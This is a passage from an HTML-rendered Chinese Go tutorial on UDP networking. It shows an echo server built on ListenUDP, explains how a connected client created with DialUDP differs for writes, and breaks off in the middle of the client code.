&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;package&lt;/span&gt; main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;import&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;net&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;os&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; host = flag.&lt;span style=&#34;color:#06287e&#34;&gt;String&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Specify the hostname&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; port = flag.&lt;span style=&#34;color:#06287e&#34;&gt;Int&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;12345&lt;/span&gt;, &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Specify the port&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        flag.&lt;span style=&#34;color:#06287e&#34;&gt;Parse&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; udpAddr = net.UDPAddr{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                IP:   net.&lt;span style=&#34;color:#06287e&#34;&gt;ParseIP&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;host),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                Port: &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;port,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        conn, err &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; net.&lt;span style=&#34;color:#06287e&#34;&gt;ListenUDP&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;udp&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;udpAddr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error listening:&amp;#34;&lt;/span&gt;, err)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                os.&lt;span style=&#34;color:#06287e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;defer&lt;/span&gt; conn.&lt;span style=&#34;color:#06287e&#34;&gt;Close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; data = &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;([]&lt;span style=&#34;color:#902000&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;1024&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                n, remoteAddr, err &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; conn.&lt;span style=&#34;color:#06287e&#34;&gt;ReadFromUDP&lt;/span&gt;(data)      &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// conn.Read() also works here
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error read UDP:&amp;#34;&lt;/span&gt;, err.&lt;span style=&#34;color:#06287e&#34;&gt;Error&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;[%v]:&amp;#34;&lt;/span&gt;, remoteAddr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(data[:n])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                _, err = conn.&lt;span style=&#34;color:#06287e&#34;&gt;WriteToUDP&lt;/span&gt;(data, remoteAddr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//_, err = conn.Write(data)                      // conn.Write() doesn&amp;#39;t work here
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error write UDP:&amp;#34;&lt;/span&gt;, err.&lt;span style=&#34;color:#06287e&#34;&gt;Error&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&#34;udp-client&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#udp-client&#34;&gt;
        ##
    &lt;/a&gt;
    UDP client
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;UDP客户端的连接通过&amp;quot;net.DialUDP()&amp;ldquo;来创建。因为这个连接创建时指定了远程服务器地址，因此这种连接在golang中称为&amp;rsquo;connected&amp;rsquo;类型的连接。&lt;/p&gt;
&lt;p&gt;这种类型的连接进行读操作可以使用Read()及ReadFromUDP()，区别在前面已经说过了，主要区别就是ReadFromUDP()会返回远程端的地址信息。&lt;/p&gt;
&lt;p&gt;这种类型的连接进行写操作只能用Write()，如果使用WriteToUDP()则无法完成数据发送。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;34
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;35
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;36
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;37
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;38
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;39
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;40
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;41
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;42
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;43
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;44
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;45
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;46
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;47
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;48
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;49
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;50
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;51
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;52
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;53
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;54
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;55
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;56
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;57
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;58
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;package&lt;/span&gt; main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;import&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;bufio&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;net&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;os&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; host = flag.&lt;span style=&#34;color:#06287e&#34;&gt;String&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Specify the target host IP&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; port = flag.&lt;span style=&#34;color:#06287e&#34;&gt;Int&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;12345&lt;/span&gt;, &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Specifiy the target host port&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;main&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        flag.&lt;span style=&#34;color:#06287e&#34;&gt;Parse&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; targetAddr = net.UDPAddr{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                IP:   net.&lt;span style=&#34;color:#06287e&#34;&gt;ParseIP&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;host),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                Port: &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;port,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        conn, err &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; net.&lt;span style=&#34;color:#06287e&#34;&gt;DialUDP&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;udp&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;targetAddr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error DialUDP,&amp;#34;&lt;/span&gt;, err.&lt;span style=&#34;color:#06287e&#34;&gt;Error&lt;/span&gt;())
